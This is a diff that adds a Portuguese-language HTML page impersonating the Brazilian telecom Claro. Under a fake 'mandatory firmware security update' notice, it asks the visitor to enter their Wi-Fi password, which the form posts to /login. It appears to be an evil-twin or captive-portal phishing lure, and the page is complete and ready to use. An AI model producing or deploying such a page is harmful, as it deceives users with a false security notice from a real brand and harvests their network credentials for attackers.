@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Claro - Atualização de Segurança</title>
+<style>
+  body { font-family: 'Arial', sans-serif; background-color: #f4f4f4; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
+  .container { background: white; padding: 2rem; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); width: 90%; max-width: 400px; text-align: center; }
+  .logo { max-width: 150px; margin-bottom: 1.5rem; }
+  h2 { color: #e30613; margin-bottom: 1rem; }
+  p { color: #666; font-size: 0.9rem; margin-bottom: 1.5rem; }
+  input { width: 100%; padding: 10px; margin-bottom: 1rem; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
+  button { background-color: #e30613; color: white; border: none; padding: 12px; width: 100%; border-radius: 4px; font-weight: bold; cursor: pointer; }
+  button:hover { background-color: #bd0510; }
+  .footer { margin-top: 1.5rem; font-size: 0.8rem; color: #999; }
+</style>
+</head>
+<body>
+<div class="container">
+  <svg class="logo" viewBox="0 0 200 60" xmlns="http://www.w3.org/2000/svg">
+    <!-- Placeholder for Claro Logo - Generic Red Circle/Text -->
+    <circle cx="30" cy="30" r="25" fill="#e30613"/>
+    <text x="65" y="40" font-family="Arial" font-weight="bold" font-size="30" fill="#e30613">Claro</text>
+  </svg>
+  <h2>Atualização de Firmware</h2>
+  <p>Detectamos uma atualização de segurança obrigatória para o seu roteador. Para continuar navegando, por favor confirme sua senha Wi-Fi.</p>
+  <form action="/login" method="POST">
+    <input type="password" name="password" placeholder="Senha do Wi-Fi" required>
+    <button type="submit">Atualizar Agora</button>
+  </form>
+  <div class="footer">
+    &copy; 2026 Claro S.A. Todos os direitos reservados.
+  </div>
+</div>
+</body>
+</html>
